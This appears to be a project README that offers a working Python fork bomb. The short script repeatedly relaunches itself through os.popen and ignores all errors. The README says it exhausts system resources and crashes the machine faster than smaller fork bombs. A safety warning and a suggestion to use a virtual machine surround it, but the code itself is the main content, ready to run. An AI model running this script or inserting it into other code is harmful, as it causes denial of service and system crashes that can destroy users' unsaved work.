# python_forkbomb

A 78-character Python forkbomb.

> [!WARNING]
> A forkbomb is a program that recursively forks itself, consuming all available system resources and eventually leading to a system crash. By running this script, you take full responsibility for any damage it may cause. If you want to test it safely, you can use a virtual environment/machine. **Use at your own risk.**

## The code

```python
import sys,os
while 1:
 try:os.popen(sys.executable+' '+__file__)
 except:pass
```

While smaller forkbombs exist, this one creates more processes, leading to a faster crash.

## Requirements

- [Python](https://www.python.org/downloads)
